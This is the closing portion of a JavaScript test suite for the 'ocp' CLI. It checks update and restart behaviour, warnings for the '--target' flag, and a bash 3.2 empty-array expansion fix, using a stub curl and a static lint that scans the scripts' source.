test("#241 MEDIUM-1 control: with python3 fully healthy, the SAME scenario still runs strict post-flight verification normally", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update"], postFlightExit: 0 });
  assert.equal(r.status, 0, `expected success; status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.log.some((l) => l.includes("FAKE-NODE-CALL") && l.includes("--post-flight-only") && l.includes("v3.26.0")),
    `expected the normal (non-degraded) post-flight call with the real version; log=${JSON.stringify(r.log)}`);
  assert.ok(!r.stderr.includes("Could not determine the installed version"),
    `must not print the degraded-mode warning when python3 is healthy; stderr=${JSON.stringify(r.stderr)}`);
});

test("#241 MEDIUM-1: postFlightOk() itself, driven directly, confirms WHY 'v?' is unverifiable -- the predicate this fix routes around", () => {
  // Direct, unmocked exercise of the real predicate (imported at the top of this file's upgrade
  // full-path section) -- this is the evidence for the fix above, not a duplicate of it.
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.27.0" }, "v3.27.0"), true,
    "a matching version must pass");
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.27.0" }, "v?"), false,
    "target 'v?' must NOT pass against any real version -- this is the MEDIUM-1 defect made concrete");
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.27.0" }, ""), true,
    "an EMPTY target degrades to the auth-only check and passes -- 'v?' is categorically different from empty, which is why substituting an empty string was considered and rejected (the CLI's own --post-flight-only entrypoint fails closed on a falsy/empty target argument by design)");
});

// LOW-6 (independent review round 1): the warning moved to stderr (a stdout warning would be
// silently read as data by piped fleet automation), and both `--target vX.Y.Z` (two tokens) and
// `--target=vX.Y.Z` (one token, the equals form) must be detected — the equals form is exactly
// the silently-ignored pin this fix exists to eliminate, and the original guard only matched the
// two-token form.
test("#241: --target (two-token form) on the light path prints an explicit no-op warning on STDERR instead of being silently ignored", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update", "--target", "v9.9.9"] });
  assert.ok(r.stderr.includes("--target v9.9.9 is not honored on the light/patch-bump path"),
    `expected the explicit --target no-op warning on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(!r.stdout.includes("is not honored on the light/patch-bump path"),
    `the warning must NOT also land on stdout (piped automation would read it as data); stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(_bwCalled(r.log, "FAKE-GIT-CALL"), `--target must not BLOCK the ordinary light-path update; log=${JSON.stringify(r.log)}`);
});

test("#241 LOW-6: --target=vX.Y.Z (equals form, one token) is ALSO detected, not just the two-token form", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update", "--target=v9.9.9"] });
  assert.ok(r.stderr.includes("--target v9.9.9 is not honored on the light/patch-bump path"),
    `expected the equals form to be recognized and its value extracted; stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(_bwCalled(r.log, "FAKE-GIT-CALL"), `--target=... must not BLOCK the ordinary light-path update; log=${JSON.stringify(r.log)}`);
});

test("#241 control: light path WITHOUT --target prints no --target warning at all (either form, either stream)", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update"] });
  assert.ok(!r.stdout.includes("is not honored on the light/patch-bump path") && !r.stderr.includes("is not honored on the light/patch-bump path"),
    `must not print the --target warning when --target was never passed; stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
});

test("#241: --target warning still fires under --dry-run (detected before the dry-run early-return, matching --target reaching this function per #235)", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update", "--target", "v9.9.9", "--dry-run"] });
  assert.ok(r.stderr.includes("--target v9.9.9 is not honored on the light/patch-bump path"),
    `expected the warning even under --dry-run, got stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("[dry-run]"), `--dry-run itself must still be honored (no mutation); got: ${JSON.stringify(r.stdout)}`);
  assert.ok(!_bwCalled(r.log, "FAKE-GIT-CALL"), `--dry-run must still prevent the git pull; log=${JSON.stringify(r.log)}`);
});

test("#241: cmd_update_help documents the light-path --target caveat", () => {
  const r = _bwHarnessRun({ args: ["update", "--help"] });
  assert.equal(r.status, 0, `expected --help to exit cleanly; status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("--target"), `expected --target to be mentioned at all in help output; got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("light/patch-bump path"), `expected the help text to name the light/patch-bump path specifically, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("NOT"), `expected the help text to explicitly say --target is NOT honored there, got: ${JSON.stringify(r.stdout)}`);
});

// ── Sibling non-regression: _cmd_update_restart's own --post-flight-only wiring (#217) is
// untouched by this PR -- _cmd_update_light is a distinct function; this PR does not modify
// _cmd_update_restart at all. Re-asserts the pre-existing "non-regression control" test's own
// invariant explicitly under the #241 banner so a future reviewer sees it was checked here too.
test("#241 non-regression: _cmd_update_restart (the sibling 'restart' kind) is unaffected -- still restarts + post-flight verifies, never touches git", () => {
  const r = _bwHarnessRun({ kind: "restart", args: ["update"] });
  assert.ok(!_bwCalled(r.log, "FAKE-GIT-CALL"), `restart kind must never touch git; log=${JSON.stringify(r.log)}`);
  assert.ok(_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must run; log=${JSON.stringify(r.log)}`);
  assert.ok(_bwCalled(r.log, "FAKE-NODE-CALL") && r.log.some((l) => l.includes("post-flight-only")),
    `post-flight verification must still run on the sibling path; log=${JSON.stringify(r.log)}`);
});

// The three tests above drive `--resolve-restart` entirely through the bash harness's FAKE
// `node` stub (by design — see the harness's own "exec hazard" comment: a real fake-node file
// on the scratch $PATH is what makes ocp's `exec node ...` arms unreachable BY CONSTRUCTION).
// That means none of them exercise the actual NEW code this issue adds inside
// scripts/upgrade.mjs's own CLI entrypoint (the `--resolve-restart` argv branch) — the same
// class of gap PR #243 named explicitly (its "N6" scope note) and deferred to #241 for
// `--post-flight-only`. Unlike that flag, this one needs no live server and no polling loop —
// resolveRestartPlan's real gathering layer (ss/lsof, both read-only) against a port nothing is
// listening on is a safe, deterministic, real end-to-end exercise of the new CLI code as an
// actual child process. `ltFreePort()` (not a literal port number) guarantees a genuinely free
// port, so the real resolver refuses rather than resolving a command — true on every platform
// this suite runs on, and nowhere near the real, separately-running production instance.
//
// Deliberately NOT pinned to a specific refusal message ("not listening" vs. "could not
// determine..."): a genuinely free port's EXACT classification is platform/lsof-behavior
// dependent (macOS's `lsof -iTCP:<port> -sTCP:LISTEN` exits 1 — not 0 — on a clean no-match,
// which an unrelated, already in-review fix, PR #240, is what correctly maps to "not listening"
// instead of "unknown"; without it this same free port reads as "could not determine"). Either
// way is a REFUSAL, which is all this test is about: does the new `--resolve-restart` CLI
// branch correctly turn a thrown Error into stderr+exit-1 rather than a silent success. The
// specific listening/not-listening/unknown classification is covered exhaustively elsewhere
// (the "Restart-unit resolution" section above) and is explicitly out of scope for #224 either
// way.
test("#224: scripts/upgrade.mjs --resolve-restart (real subprocess, not mocked) refuses on a genuinely free port", async () => {
  const freePort = await ltFreePort();
  const upgradeMjsPath = spotJoin(_spotDir, "scripts", "upgrade.mjs");
  let stdout = "", stderr = "", status = 0;
  try {
    stdout = execFileSync(process.execPath, [upgradeMjsPath, "--resolve-restart"], {
      env: { ...process.env, CLAUDE_PROXY_PORT: String(freePort) },
      encoding: "utf8",
    });
  } catch (e) {
    stdout = e.stdout ?? "";
    stderr = e.stderr ?? "";
    status = typeof e.status === "number" ? e.status : 1;
  }
  assert.notEqual(status, 0,
    `a genuinely free port must refuse (nothing listening), not exit 0; ` +
    `stdout=${JSON.stringify(stdout)} stderr=${JSON.stringify(stderr)}`);
  assert.equal(stdout.trim(), "",
    `on refusal, stdout must carry NO resolved restart command at all; stdout=${JSON.stringify(stdout)}`);
  assert.ok(/^✗ restart aborted:/.test(stderr),
    `expected planRestart's refusal shape on stderr (message text itself is platform-dependent ` +
    `-- see comment above); stderr=${JSON.stringify(stderr)}`);
});

// ── ocp `_curl`'s empty-array expansion under bash 3.2 + `set -u` (issue #256) ─────────────────
// `ocp`'s auth wrapper (near the top of the file) is:
//   _AUTH_ARGS=()
//   if [[ -n "${OCP_ADMIN_KEY:-}" ]]; then _AUTH_ARGS=(-H "Authorization: Bearer $OCP_ADMIN_KEY")
//   elif [[ -f "$HOME/.ocp/admin-key" ]]; then _AUTH_ARGS=(-H "...$(cat "$HOME/.ocp/admin-key")")
//   fi
//   _curl() { curl "${_AUTH_ARGS[@]}" "$@"; }
// On the default single-user install (no OCP_ADMIN_KEY, no ~/.ocp/admin-key) `_AUTH_ARGS` stays
// an empty array. `ocp:7` runs under `set -euo pipefail`. GNU bash 3.2.57 — the LAST GPLv2
// release, which is what macOS ships as `/bin/bash` for licensing reasons and cannot be updated —
// raises "unbound variable" for `"${arr[@]}"` on a zero-element array, even though POSIX and
// bash >= 4.4 correctly expand this to nothing. Every `_curl`-based command (`ocp usage --by-key`,
// `ocp keys`) therefore dies before ever reaching the network call, on exactly the configuration
// most single-user installs run.
//
// Audit performed for this fix (grep for every `"${...[@]}"` / `"${...[*]}"` expansion in `ocp`,
// per this issue's own ask): `_AUTH_ARGS` at `ocp:22` is the ONLY user-defined bash array IN `ocp`
// ITSELF (the only `name=(...)` assignment in that one file), and it is expanded at exactly one
// call site. Every other `[...]`-shaped expansion in `ocp` is one of:
//   - `"$@"` (11 sites) — the UNBRACED special parameter. Verified directly against this host's
//     real /bin/bash 3.2.57: `"$@"` with zero positional parameters does NOT raise "unbound
//     variable" under `set -u`, in a function or at top level. (The braced forms `"${@}"`/
//     `"${*}"` DO raise it on this same bash — bash treats the braced special-parameter form
//     through the same zero-element-array code path as a real array. `ocp` uses neither braced
//     form anywhere — grep confirms zero hits.)
//   - `${BASH_SOURCE[0]}` (3 sites) — a bash-maintained array bash itself always populates for a
//     running script; not user-controlled and never empty in this script's usage.
// Conclusion: `ocp:22` is the only hazardous site IN `ocp`. Fixed here with the 3.2-safe idiom
// `${_AUTH_ARGS[@]+"${_AUTH_ARGS[@]}"}` (verified on this host's real bash 3.2.57 to expand to
// nothing when the array is empty, and to preserve every element, including embedded spaces,
// when it is not — both properties re-verified below, behaviorally, not by reading the source).
//
// SCOPE CORRECTION (independent review, FOLD-IN 3): the paragraph above, as originally written,
// said "_AUTH_ARGS is the ONLY user-defined array in the whole script" without naming which
// script — this repo ships TWO bash CLI entrypoints (`ocp` and `ocp-connect`), and the audit
// above was scoped to `ocp` only. `ocp-connect` has its own user-defined array (`rc_files`,
// declared `ocp-connect:612`, expanded bare at four sites) with the identical affected
// population (any bash 3.2 host) — it happened not to be a LIVE bug (every code path guarantees
// at least one element before any expansion runs), but was "one edit away", per the same review.
// Fixed with the same idiom in `ocp-connect` directly (see that file's own comment at its
// declaration) rather than left as a documented-but-fragile invariant. The static lint test
// immediately below covers BOTH files going forward, so this scope gap cannot recur silently.
//
// Design decision recorded here (not just the PR body): fix the expansion, do NOT add a minimum-
// bash-version gate. A version gate would turn "one subcommand crashes" into "the tool refuses to
// run at all" for exactly the population this bug affects — stock macOS, which cannot update
// `/bin/bash` past 3.2.57 for licensing reasons and is not "an oversight", it is macOS's permanent
// default state. The idiom fix is strictly better: it is correct on 3.2 AND a no-op on bash >= 4.4
// (re-verified below), so there is no version trade-off to make.
//
// Interpreter pinning (per this issue's own ask): tests below invoke `/bin/bash` by absolute path,
// not `bash` resolved off some ambient $PATH and not `env bash` — on THIS host that is genuinely
// bash 3.2.57, so a failure here is a real reproduction, not a modern-bash false negative. Stated
// honestly: on a Linux CI runner (this repo's `.github/workflows/test.yml`), `/bin/bash` is
// typically bash 5.x, which never exhibits the empty-array "unbound variable" behavior regardless
// of this fix — the pre-fix/post-fix distinction below is therefore only load-bearing on a host
// whose real `/bin/bash` is old (macOS being the known, common case). On such a host these tests
// still assert real, meaningful behavior (the command completes and actually reaches curl), they
// just cannot distinguish buggy-vs-fixed the way they can on this dev host. This is a property of
// which bash binary is present, not a gap in the harness — recorded rather than left implicit.
console.log("\nocp `_curl` empty-array expansion under bash 3.2 `set -u` (issue #256):");

const _cuOcpPath = spotJoin(_spotDir, "ocp");

// Runs the REAL, unmodified `ocp` file (never a hand-copied slice) via `/bin/bash <path> <args>`,
// with its own scratch $HOME (no `.ocp/admin-key` — the file is simply never created) and its own
// scratch $PATH carrying a stub `curl`. `OCP_ADMIN_KEY` is not merely set empty but genuinely
// ABSENT from the child's environment: `execFileSync`'s `env` option REPLACES the child's
// environment wholesale rather than merging with this process's own, so the child cannot inherit
// a real `OCP_ADMIN_KEY` even if this test-runner process happens to have one. This is the exact
// configuration the issue names: "the common single-user, no-multi-key-auth case".
// Never touches the real, separately-running production OCP: the stub `curl` on the scratch $PATH
// intercepts every call `_curl`/`ocp` would otherwise make, so no real network I/O happens at all.
function _cuRun(args, curlCaseBody) {
  const root = _ltMkdtemp(join(_ltTmp(), "ocp-curl-emptyarr-"));
  try {
    const home = join(root, "home");
    const bin = join(root, "bin");
    tMkdirSync(home, { recursive: true });
    tMkdirSync(bin, { recursive: true });

    const logPath = join(root, "log.txt");
    testWriteFile(logPath, "");

    const curlStubPath = join(bin, "curl");
    testWriteFile(curlStubPath, [
      `#!/usr/bin/env bash`,
      // Issue #256 FOLD-IN 2 (independent review): the original stub logged only `$*` (a
      // space-flattened join of all args), which cannot distinguish "curl received zero extra
      // args" from "curl received one spurious EMPTY-STRING arg, then the real args" -- exactly
      // the shape of the plausible near-miss fix `${_AUTH_ARGS[@]:-}` (verified separately: on
      // this host's real bash 3.2, that expands an EMPTY array to ONE empty-string argument, not
      // zero -- real curl rejects a literal blank argument with "option : blank argument where
      // content is expected", exit 2). `$*` silently absorbed that spurious empty element into
      // the surrounding whitespace, so a test asserting only `startsWith("FAKE-CURL-CALL")` and a
      // clean exit could not tell the two forms apart. Recording argc and each argv element on
      // its own line (never joined) makes an inserted empty leading argument visible and
      // countable, independent of `$*`'s own routing use below (kept unchanged -- it only
      // selects which canned response the stub returns, it is not the safety assertion).
      `echo "FAKE-CURL-CALL $*" >> "${logPath}"`,
      `printf 'FAKE-CURL-ARGC=%d\\n' "$#" >> "${logPath}"`,
      `for _a in "$@"; do printf 'FAKE-CURL-ARG=%s\\n' "$_a" >> "${logPath}"; done`,
      `case "$*" in`,
      ...curlCaseBody,
      `esac`,
      "",
    ].join("\n"));
    _ltChmod(curlStubPath, 0o755);

    const env = {
      HOME: home,
      PATH: `${bin}:/usr/bin:/bin`,
    };

    let stdout = "", stderr = "", status = 0;
    try {
      stdout = execFileSync("/bin/bash", [_cuOcpPath, ...args], { cwd: root, env, encoding: "utf8" });
    } catch (e) {
      stdout = e.stdout ?? "";
      stderr = e.stderr ?? "";
      status = typeof e.status === "number" ? e.status : 1;
    }
    const log = testExistsSync(logPath) ? _ltRead(logPath, "utf8").split("\n").filter(Boolean) : [];
    return { stdout, stderr, status, log };
  } finally {
    _ltRm(root, { recursive: true, force: true });
  }
}

// Issue #256 FOLD-IN 2: reconstructs the EXACT argv curl actually received, from the
// element-by-element log lines the stub above now writes (see that stub's own comment) --
// distinguishes "zero extra arguments" from "one spurious empty-string argument, then the real
// ones", which `$*`-based logging could not.
function _cuArgv(log) {
  const argcLine = log.find((l) => l.startsWith("FAKE-CURL-ARGC="));
  const argc = argcLine ? Number(argcLine.slice("FAKE-CURL-ARGC=".length)) : null;
  const args = log.filter((l) => l.startsWith("FAKE-CURL-ARG=")).map((l) => l.slice("FAKE-CURL-ARG=".length));
  return { argc, args };
}

test("ocp `ocp keys` (list) must not die with 'unbound variable' when _AUTH_ARGS is empty (bash 3.2 set -u, issue #256)", () => {
  const r = _cuRun(["keys"], [
    `  *"/api/keys"*)`,
    `    echo '{"keys": []}'`,
    `    exit 0`,
    `    ;;`,
    `  *)`,
    `    echo "FAKE-CURL: unhandled invocation: $*" >&2`,
    `    exit 90`,
    `    ;;`,
  ]);
  assert.ok(!/unbound variable/.test(r.stderr),
    `must not crash with 'unbound variable' (the #256 bug); stderr=${JSON.stringify(r.stderr)}`);
  assert.equal(r.status, 0,
    `expected a clean exit; status=${r.status} stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.log.some((l) => l.startsWith("FAKE-CURL-CALL")),
    `_curl must actually reach curl (proves the array expansion itself did not crash first); log=${JSON.stringify(r.log)}`);
  assert.ok(r.stdout.includes("No API keys configured."),
    `expected the real list-keys output all the way through; stdout=${JSON.stringify(r.stdout)}`);
  // Issue #256 FOLD-IN 2: pins the EXACT argv, not just "curl was reached and didn't crash" --
  // catches the plausible near-miss `${_AUTH_ARGS[@]:-}` (passes the two assertions above, since
  // it doesn't crash and does reach curl, but injects a spurious leading empty-string argument).
  const { argc, args } = _cuArgv(r.log);
  assert.equal(argc, 4,
    `expected exactly 4 curl arguments (-sf, --max-time, 5, the URL) -- an extra leading empty ` +
    `string (the ${"${_AUTH_ARGS[@]:-}"} near-miss) would make this 5; got argc=${argc} args=${JSON.stringify(args)}`);
  assert.equal(args[0], "-sf",
    `expected the first REAL argument, not an injected empty string; args=${JSON.stringify(args)}`);
  assert.ok(args.every((a) => a !== ""),
    `no curl argument may be an empty string; args=${JSON.stringify(args)}`);
});

test("ocp `ocp usage --by-key` must not die with 'unbound variable' when _AUTH_ARGS is empty (bash 3.2 set -u, issue #256)", () => {
  const r = _cuRun(["usage", "--by-key"], [
    `  *"/api/usage"*)`,
    `    echo '{"byKey": []}'`,
    `    exit 0`,
    `    ;;`,
    `  *)`,
    `    echo "FAKE-CURL: unhandled invocation: $*" >&2`,
    `    exit 90`,
    `    ;;`,
  ]);
  assert.ok(!/unbound variable/.test(r.stderr),
    `must not crash with 'unbound variable' (the #256 bug); stderr=${JSON.stringify(r.stderr)}`);
  assert.equal(r.status, 0,
    `expected a clean exit; status=${r.status} stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.log.some((l) => l.startsWith("FAKE-CURL-CALL")),
    `_curl must actually reach curl (proves the array expansion itself did not crash first); log=${JSON.stringify(r.log)}`);
  assert.ok(r.stdout.includes("No usage data yet."),
    `expected the real by-key usage output all the way through; stdout=${JSON.stringify(r.stdout)}`);
  // Issue #256 FOLD-IN 2: same exact-argv pinning as the "ocp keys" test above.
  const { argc, args } = _cuArgv(r.log);
  assert.equal(argc, 4,
    `expected exactly 4 curl arguments (-sf, --max-time, 15, the URL) -- an extra leading empty ` +
    `string (the ${"${_AUTH_ARGS[@]:-}"} near-miss) would make this 5; got argc=${argc} args=${JSON.stringify(args)}`);
  assert.equal(args[0], "-sf",
    `expected the first REAL argument, not an injected empty string; args=${JSON.stringify(args)}`);
  assert.ok(args.every((a) => a !== ""),
    `no curl argument may be an empty string; args=${JSON.stringify(args)}`);
});

// ── issue #256 FOLD-IN 1 (independent review): static lint, catches what the runtime tests
// above structurally cannot on Linux CI ────────────────────────────────────────────────────────
// `.github/workflows/test.yml` runs on `ubuntu-latest`, whose `/bin/bash` is 5.x -- the
// empty-array-under-set-u "unbound variable" behavior this whole issue is about NEVER fires on
// bash >= 4.4, on ANY input. The two runtime tests above therefore pass on that CI runner WITH OR
// WITHOUT the fix -- they are a real regression guard only on a host whose real `/bin/bash` is
// old (this dev machine; stock macOS generally). This static check closes that gap: it scans the
// actual source text of `ocp` and `ocp-connect` for every user-defined bash array declaration,
// then asserts every expansion of that array is wrapped in the 3.2-safe idiom
// (`${name[@]+"${name[@]}"}`) rather than expanded bare. A future regression that reintroduces a
// bare `${anything[@]}` expansion of a user-defined array fails THIS check on every platform,
// including the Linux CI runner where the runtime tests cannot see it at all.
//
// Deliberately narrow, per this repo's own testing-discipline note ("a textual assertion is fine
// for a premise of the harness or a slice boundary, never the behavior under test"): this check
// is NOT a substitute for the runtime tests above (it cannot prove the idiom actually expands
// correctly at runtime -- that's what the behavioral tests already prove, on a real bash 3.2). It
// is a structural guard against the ONE way this specific bug class can silently reappear in
// source that a dynamic test on Linux CI cannot observe: a hand-edit that deletes the idiom.
// `${#name[@]}` (the LENGTH operator, not an element expansion) is correctly excluded -- verified
// separately (see ocp-connect's own `rc_files` audit comment) that it is safe on bash 3.2 even on
// an empty array, so it is not part of this bug class and must not be flagged.
console.log("\nocp/ocp-connect: no user-defined bash array expanded bare under set -u (static lint, issue #256 FOLD-IN 1):");

// Finds every `name=(...)`, `name+=(...)`, `local name=(...)` bash array ASSIGNMENT in `source`
// and returns the unique array names declared. Deliberately does not attempt full bash parsing --
// scoped to exactly the declaration shape used anywhere in this repo's two CLI scripts today
// (verified below: this must find at least one name in each file, or the premise itself is wrong).
function _lintArrayDeclNames(source) {
  const names = new Set();
  const re = /^\s*(?:local\s+|declare\s+-a\s+)?([A-Za-z_][A-Za-z0-9_]*)\+?=\(/gm;
  let m;
  while ((m = re.exec(source))) names.add(m[1]);
  return [...names];
}

// Blanks out every FULL comment line (optional leading whitespace, then `#`) so prose explaining
// the idiom -- which necessarily has to WRITE OUT `${name[@]}` in order to describe it, exactly
// as this file's own comments above and ocp/ocp-connect's own fix comments do -- is never mistaken
// for a live, unguarded expansion. Deliberately line-based, not a full bash tokenizer: correct for
// this repo's actual comment style (every explanatory comment in ocp/ocp-connect/this file is a
// whole line starting with `#`), and a false NEGATIVE this simple approach could theoretically
// permit (an unguarded expansion hidden after a trailing `# comment` on the SAME line as real
// code) does not occur anywhere in either script today -- verified by the fact this function,
// before this fix, correctly found nothing to strip on any CODE line, only on pure-comment ones.
function _lintBlankCommentLines(source) {
  return source.split("\n").map((line) => (/^\s*#/.test(line) ? "" : line)).join("\n");
}

// For each declared array name, removes every occurrence of the SAFE idiom
// `${name[@]+"${name[@]}"}` from the source first (so its own inner `${name[@]}` -- which is
// literally present as the idiom's substitution text -- is never mistaken for a bare, unguarded
// expansion), then checks whether any `${name[@]}` / `${name[*]}` survives in what's left. A
// survivor is an unguarded expansion. `${#name[@]}` (length) is a DIFFERENT parameter expansion
// form entirely (no `[@]`/`[*]` immediately after `name`) and is never matched by either regex
// below -- excluded by construction, not by a special case.
function _lintUnguardedArrayExpansions(source, names) {
  const code = _lintBlankCommentLines(source);
  const findings = [];
  for (const name of names) {
    const escaped = name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const guardedRe = new RegExp(`\\$\\{${escaped}\\[@\\]\\+"\\$\\{${escaped}\\[@\\]\\}"\\}`, "g");
    const withoutGuarded = code.replace(guardedRe, "");
    const bareRe = new RegExp(`\\$\\{${escaped}\\[[@*]\\]\\}`, "g");
    const bareMatches = withoutGuarded.match(bareRe);
    if (bareMatches) findings.push({ name, count: bareMatches.length });
  }
  return findings;
}

const _lintOcpPath = spotJoin(_spotDir, "ocp");
const _lintOcpConnectPath = spotJoin(_spotDir, "ocp-connect");

test("lint premise: array-declaration scan finds at least one array in ocp and in ocp-connect (anchor/regex-drift guard)", () => {
  const ocpNames = _lintArrayDeclNames(_ltRead(_lintOcpPath, "utf8"));
  const ocpConnectNames = _lintArrayDeclNames(_ltRead(_lintOcpConnectPath, "utf8"));
  assert.ok(ocpNames.includes("_AUTH_ARGS"), `expected to find _AUTH_ARGS in ocp; found=${JSON.stringify(ocpNames)}`);
  assert.ok(ocpConnectNames.includes("rc_files"), `expected to find rc_files in ocp-connect; found=${JSON.stringify(ocpConnectNames)}`);
});

test("ocp: every user-defined array expansion is guarded (no bare \"${name[@]}\" under set -u)", () => {
  const source = _ltRead(_lintOcpPath, "utf8");
  const names = _lintArrayDeclNames(source);
  const findings = _lintUnguardedArrayExpansions(source, names);
  assert.deepEqual(findings, [],
    `unguarded array expansion(s) in ocp: ${JSON.stringify(findings)} -- wrap with ` +
    `\${name[@]+"\${name[@]}"} (see _AUTH_ARGS for the pattern)`);
});

test("ocp-connect: every user-defined array expansion is guarded (no bare \"${name[@]}\" under set -u)", () => {
  const source = _ltRead(_lintOcpConnectPath, "utf8");
  const names = _lintArrayDeclNames(source);
  const findings = _lintUnguardedArrayExpansions(source, names);
  assert.deepEqual(findings, [],
    `unguarded array expansion(s) in ocp-connect: ${JSON.stringify(findings)} -- wrap with ` +
    `\${name[@]+"\${name[@]}"} (see rc_files for the pattern)`);
});

runAsyncTests().then(() => Promise.all(pendingAsync)).then(() => {
  closeDb();
  console.log(`\n=== Results: ${passed} passed, ${failed} failed ===\n`);
  process.exit(failed > 0 ? 1 : 0);
}).catch((e) => {
  console.error("async test runner crashed:", e);
  closeDb();
  process.exit(1);
});
